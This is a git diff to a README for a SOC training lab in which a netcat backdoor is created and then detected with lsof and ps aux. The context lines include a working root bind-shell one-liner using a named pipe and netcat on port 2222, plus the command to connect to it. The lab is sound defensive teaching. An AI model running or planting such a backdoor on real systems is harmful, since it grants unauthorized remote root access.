@@ -2,6 +2,7 @@
 
 This lab is provided by Antisyphon Training's SOC Core Skills course. We will explore the setup and detection of backdoor malware using a netcat listener, a common tool for establishing unauthorized remote access. The exercise aims to simulate a real-world cyber threat scenario, providing hands-on experience in malware analysis and defense techniques. By leveraging the Linux Command Line Interface (CLI), we will detect and analyze the backdoor. 
 <br>
+<br>
 
 ## Create the malware 
 - We will first sudo into root so that we can have a backdoor running root.
@@ -16,7 +17,6 @@ sudo su -
 mknod backpipe p
 /bin/bash  0<backpipe | nc -l 2222 1>backpipe
 ```
-<br>
 
 ![backdoor](https://github.com/trixiahorner/Linux_CLI/assets/162903587/d9187608-208a-4da0-99d3-70435d6ef994)
 <br>
@@ -33,7 +33,6 @@ ifconfig
 ```
 ncat 172.17.231.122 2222
 ```
-<br>
 
 ![netcat](https://github.com/trixiahorner/Linux_CLI/blob/main/images/C2.png?raw=true)
 <br>
@@ -51,9 +50,8 @@ sudo su -
 ```
 lsof -i -P
 ```
-<br>
 
-![netcat](https://github.com/trixiahorner/Linux_CLI/blob/main/images/C3.png?raw=true)
+![lsof](https://github.com/trixiahorner/Linux_CLI/blob/main/images/C3.png?raw=true)
 <br>
 <br>
 
@@ -61,11 +59,20 @@ lsof -i -P
 ```
 lsof -p 203
 ```
+
+![lsof](https://github.com/trixiahorner/Linux_CLI/blob/main/images/C4.png?raw=true)
+<br>
 <br>
 
-![netcat](https://github.com/trixiahorner/Linux_CLI/blob/main/images/C4.png?raw=true)
+- We can look at the full processes using the ps command (-a for all, -u to sort by user, -x to include the processes uning a teletype terminal)
+```
+ps aux
+```
+
+![psaux](https://github.com/trixiahorner/Linux_CLI/blob/main/images/c5.png?raw=true)
 <br>
 <br>
+
 
 
 
